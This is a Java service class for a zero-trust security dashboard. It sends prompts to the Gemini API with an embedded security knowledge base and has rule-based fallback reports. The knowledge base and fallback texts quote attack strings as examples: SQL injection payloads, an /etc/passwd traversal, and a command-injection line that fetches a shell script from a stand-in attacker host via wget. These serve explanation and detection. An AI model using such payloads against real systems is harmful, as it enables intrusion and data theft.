package com.zerotrust.service;

import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import org.springframework.web.reactive.function.client.WebClient;
import reactor.core.publisher.Mono;

import java.util.List;
import java.util.Map;

/**
 * AI Security Assistant using Google Gemini API with a RAG-style prompt.
 *
 * <p>Provider-agnostic design: replace this implementation with OpenAI or Ollama
 * by swapping the HTTP call — the controller contract stays the same.
 *
 * <p>Enable by setting {@code app.ai.enabled=true} and providing a Gemini API key
 * in {@code app.ai.gemini-api-key}.
 */
@Slf4j
@Service
public class AiService {

    private final boolean aiEnabled;
    private final String  geminiApiKey;
    private final String  geminiModel;
    private final String  geminiApiUrl;
    private final WebClient webClient;

    // Security knowledge base (acts as the "retrieval" part of RAG)
    private static final String SECURITY_KNOWLEDGE_BASE = """
        === ZERO TRUST SECURITY KNOWLEDGE BASE ===

        THREAT TYPES AND EXPLANATIONS:
        
        SQL_INJECTION: Attacker injects malicious SQL code into input fields to manipulate database queries.
        Common patterns: OR 1=1, UNION SELECT, DROP TABLE, --, xp_cmdshell.
        Impact: Unauthorized data access, data deletion, authentication bypass.
        Remediation: Use parameterized queries, input validation, principle of least privilege for DB user.
        
        XSS (Cross-Site Scripting): Attacker injects client-side scripts into web pages viewed by other users.
        Common patterns: <script> tags, javascript: URIs, event handlers like onload=, onclick=.
        Types: Stored XSS (persistent), Reflected XSS (non-persistent), DOM-based XSS.
        Impact: Session hijacking, credential theft, defacement, malware distribution.
        Remediation: Output encoding, Content Security Policy (CSP), HttpOnly cookies, input sanitization.
        
        BRUTE_FORCE: Automated repeated attempts to guess credentials.
        Indicators: Multiple failed logins from same IP, rapid sequential attempts.
        Impact: Account takeover, unauthorized access.
        Remediation: Account lockout, rate limiting, MFA, CAPTCHA, IP blocking.
        
        PATH_TRAVERSAL: Attacker accesses files outside the intended directory using ../ sequences.
        Common patterns: ../../etc/passwd, %2e%2e%2f, encoded sequences.
        Impact: Unauthorized file access, configuration exposure, credential theft.
        Remediation: Input validation, chroot jails, avoid user-controlled file paths.
        
        COMMAND_INJECTION: Attacker executes arbitrary OS commands via vulnerable input fields.
        Common patterns: ; ls, | cat /etc/passwd, && wget attacker.com/shell.sh.
        Impact: Full system compromise, data exfiltration, persistent access.
        Remediation: Never pass user input to shell commands, use safe APIs, input allowlisting.
        
        OWASP TOP 10 OVERVIEW:
        A01: Broken Access Control - Most critical; enforce least privilege.
        A02: Cryptographic Failures - Use TLS, strong algorithms (AES-256, RSA-2048).
        A03: Injection - SQL, OS, LDAP injection. Use parameterized queries.
        A04: Insecure Design - Security by design, threat modeling.
        A05: Security Misconfiguration - Disable defaults, patch systems, secure headers.
        A06: Vulnerable Components - Keep dependencies updated, use SCA tools.
        A07: Authentication Failures - MFA, secure session management.
        A08: Software Integrity Failures - Verify signatures, secure CI/CD.
        A09: Logging Failures - Log all security events, protect log integrity.
        A10: SSRF - Validate all server-side requests.
        
        SEVERITY LEVELS:
        LOW (0-25): Informational, minimal risk. Monitor and log.
        MEDIUM (26-50): Potential risk. Investigate within 24 hours.
        HIGH (51-75): Significant risk. Investigate within 1 hour. Notify security team.
        CRITICAL (76-100): Active attack or critical vulnerability. Immediate response required.
        
        ZERO TRUST PRINCIPLES:
        1. Never trust, always verify — authenticate every request.
        2. Assume breach — minimize blast radius, segment access.
        3. Verify explicitly — use all available data points (identity, location, device).
        4. Use least privilege access — JIT/JEA, risk-based adaptive policies.
        """;

    public AiService(
            @Value("${app.ai.enabled}") boolean aiEnabled,
            @Value("${app.ai.gemini-api-key}") String geminiApiKey,
            @Value("${app.ai.gemini-model}") String geminiModel,
            @Value("${app.ai.gemini-api-url}") String geminiApiUrl) {
        this.aiEnabled    = aiEnabled;
        this.geminiApiKey = geminiApiKey;
        this.geminiModel  = geminiModel;
        this.geminiApiUrl = geminiApiUrl;
        this.webClient    = WebClient.builder().build();
    }

    /**
     * Answers a security question using RAG: injects the knowledge base as context.
     */
    public String chat(String userQuestion) {
        if (!aiEnabled || geminiApiKey == null || geminiApiKey.isBlank()) {
            return getFallbackResponse(userQuestion);
        }

        String prompt = buildRagPrompt(userQuestion);
        return callGeminiApi(prompt);
    }

    /**
     * Generates an AI explanation for a specific threat event.
     */
    public String explainThreat(String threatType, String severity,
                                 String sourceIp, String attackPayload,
                                 String detectionRule, String targetResource) {
        if (!aiEnabled || geminiApiKey == null || geminiApiKey.isBlank()) {
            return buildRuleBasedExplanation(threatType, severity, sourceIp, detectionRule);
        }

        String prompt = String.format("""
            %s
            
            === INCIDENT REPORT REQUEST ===
            You are a security analyst. Generate a professional incident report for this threat:
            
            Threat Type: %s
            Severity: %s
            Source IP: %s
            Target Resource: %s
            Detection Rule: %s
            Attack Payload: %s
            
            Provide:
            1. ATTACK DESCRIPTION: What happened and how the attack works
            2. ROOT CAUSE: Why this was triggered
            3. IMPACT ANALYSIS: What could have been compromised
            4. RECOMMENDED ACTIONS: Step-by-step remediation (numbered list)
            5. PREVENTION: How to prevent similar attacks
            
            Be concise, professional, and actionable. Format as a structured security report.
            """,
            SECURITY_KNOWLEDGE_BASE, threatType, severity, sourceIp,
            targetResource, detectionRule, attackPayload);

        return callGeminiApi(prompt);
    }

    /**
     * Generates a security summary report.
     */
    public String generateReport(int totalThreats, int criticalThreats,
                                  int failedLogins, int securityScore,
                                  Map<String, Long> threatsByType) {
        if (!aiEnabled || geminiApiKey == null || geminiApiKey.isBlank()) {
            return buildRuleBasedReport(totalThreats, criticalThreats, failedLogins, securityScore);
        }

        String prompt = String.format("""
            %s
            
            === SECURITY REPORT REQUEST ===
            Generate an executive security summary based on these metrics (last 24 hours):
            
            Total Threats Detected: %d
            Critical Severity Threats: %d
            Failed Login Attempts: %d
            Current Security Score: %d/100
            Threats by Type: %s
            
            Provide:
            1. EXECUTIVE SUMMARY (2-3 sentences)
            2. KEY FINDINGS (bullet points)
            3. RISK ASSESSMENT (overall posture)
            4. TOP RECOMMENDATIONS (prioritized action items)
            5. TREND ANALYSIS (what patterns are emerging)
            
            Tone: professional, concise, executive-friendly.
            """,
            SECURITY_KNOWLEDGE_BASE, totalThreats, criticalThreats,
            failedLogins, securityScore, threatsByType.toString());

        return callGeminiApi(prompt);
    }

    // ─────────────────────────────────────────────
    // PRIVATE HELPERS
    // ─────────────────────────────────────────────

    private String buildRagPrompt(String userQuestion) {
        return String.format("""
            %s
            
            === USER QUESTION ===
            %s
            
            Answer based on the security knowledge base above. Be concise, accurate, and actionable.
            If the question is not security-related, politely redirect to security topics.
            Format your response clearly with headers if needed.
            """, SECURITY_KNOWLEDGE_BASE, userQuestion);
    }

    private String callGeminiApi(String prompt) {
        try {
            String url = geminiApiUrl + "/" + geminiModel + ":generateContent?key=" + geminiApiKey;

            Map<String, Object> requestBody = Map.of(
                "contents", List.of(
                    Map.of("parts", List.of(Map.of("text", prompt)))
                ),
                "generationConfig", Map.of(
                    "temperature", 0.3,
                    "maxOutputTokens", 1024,
                    "topP", 0.8
                )
            );

            Map<?, ?> response = webClient.post()
                .uri(url)
                .header("Content-Type", "application/json")
                .bodyValue(requestBody)
                .retrieve()
                .bodyToMono(Map.class)
                .block();

            if (response != null && response.containsKey("candidates")) {
                List<?> candidates = (List<?>) response.get("candidates");
                if (!candidates.isEmpty()) {
                    Map<?, ?> candidate = (Map<?, ?>) candidates.get(0);
                    Map<?, ?> content   = (Map<?, ?>) candidate.get("content");
                    List<?> parts       = (List<?>) content.get("parts");
                    if (!parts.isEmpty()) {
                        return ((Map<?, ?>) parts.get(0)).get("text").toString();
                    }
                }
            }
            return "AI service returned an unexpected response. Please try again.";

        } catch (Exception e) {
            log.error("Gemini API call failed: {}", e.getMessage());
            return "AI service temporarily unavailable. " + getFallbackResponse("");
        }
    }

    private String getFallbackResponse(String question) {
        String lower = question != null ? question.toLowerCase() : "";

        if (lower.contains("sql") || lower.contains("injection")) {
            return """
                **SQL Injection** occurs when attackers insert malicious SQL into input fields.
                
                **Examples:** `' OR '1'='1`, `; DROP TABLE users--`, `UNION SELECT password FROM users`
                
                **Prevention:**
                - Use parameterized queries / prepared statements
                - Validate and sanitize all user input
                - Apply principle of least privilege to database accounts
                - Use an ORM (like Hibernate/JPA) which escapes inputs automatically
                - Enable WAF (Web Application Firewall)
                
                *Note: Enable the Gemini AI key for detailed, context-aware explanations.*
                """;
        } else if (lower.contains("xss") || lower.contains("cross-site")) {
            return """
                **XSS (Cross-Site Scripting)** injects malicious scripts into pages viewed by users.
                
                **Types:** Stored (persistent), Reflected, DOM-based
                
                **Prevention:**
                - Encode all output (HTML entities)
                - Implement Content Security Policy (CSP)
                - Use HttpOnly and Secure cookie flags
                - Validate and sanitize all input
                - Use modern frameworks that auto-escape (React, Angular)
                
                *Note: Enable the Gemini AI key for detailed, context-aware explanations.*
                """;
        } else if (lower.contains("brute") || lower.contains("force")) {
            return """
                **Brute Force Attack** uses automated tools to guess passwords by trying many combinations.
                
                **Detection signals:** Multiple failed logins from same IP, abnormal login frequency
                
                **Prevention:**
                - Account lockout after N failed attempts
                - Rate limiting per IP and per account
                - Multi-Factor Authentication (MFA)
                - CAPTCHA after failed attempts
                - Monitor and alert on suspicious login patterns
                
                *Note: Enable the Gemini AI key for detailed, context-aware explanations.*
                """;
        } else {
            return """
                I'm the Zero Trust Security Assistant. I can help you understand:
                
                - **SQL Injection** — how it works and prevention
                - **XSS** — cross-site scripting attacks
                - **Brute Force** — authentication attack patterns
                - **Path Traversal** — directory traversal attacks
                - **OWASP Top 10** — most critical security risks
                - **Incident Analysis** — understanding detected threats
                - **Zero Trust** — security architecture principles
                
                Ask me anything about these topics!
                
                *💡 Tip: Set `app.ai.enabled=true` and configure your Gemini API key in `application.yml` for full AI-powered responses.*
                """;
        }
    }

    private String buildRuleBasedExplanation(String threatType, String severity,
                                               String sourceIp, String detectionRule) {
        return String.format("""
            ## Security Incident Report
            
            **Threat Type:** %s
            **Severity:** %s
            **Source IP:** %s
            **Detection Rule:** %s
            
            ### Attack Description
            A %s attack was detected by the Zero Trust security engine. The pattern matched rule: `%s`.
            
            ### Immediate Actions
            1. Review the source IP `%s` — consider blocking if confirmed malicious
            2. Check affected resources for unauthorized changes
            3. Review audit logs for the same IP/user
            4. Update detection rules if needed
            
            ### Prevention
            - Ensure input validation is active on all endpoints
            - Keep threat detection rules updated
            - Monitor for repeat attacks from the same source
            
            *Note: Enable Gemini AI for detailed, AI-powered incident analysis.*
            """,
            threatType, severity, sourceIp, detectionRule,
            threatType.replace("_", " "), detectionRule, sourceIp);
    }

    private String buildRuleBasedReport(int total, int critical, int failedLogins, int score) {
        String posture = score >= 80 ? "GOOD" : score >= 60 ? "MODERATE" : score >= 40 ? "POOR" : "CRITICAL";
        return String.format("""
            ## Security Posture Report — Last 24 Hours
            
            **Overall Security Score: %d/100 (%s)**
            
            ### Key Metrics
            - Total threats detected: **%d**
            - Critical severity: **%d**
            - Failed login attempts: **%d**
            
            ### Risk Assessment
            %s
            
            ### Recommendations
            1. %s
            2. Review and resolve all CRITICAL and HIGH severity threats
            3. Investigate failed login attempts for credential stuffing
            4. Enable MFA for all administrator accounts
            5. Review audit logs for anomalous patterns
            
            *Note: Enable Gemini AI for AI-powered executive security reports.*
            """,
            score, posture, total, critical, failedLogins,
            score >= 80 ? "Security posture is healthy. Continue monitoring."
                : score >= 60 ? "Security posture needs attention. Address open threats."
                : "Security posture is weak. Immediate action required.",
            critical > 0 ? "URGENT: Resolve " + critical + " CRITICAL threats immediately"
                         : "No critical threats — maintain vigilance");
    }
}
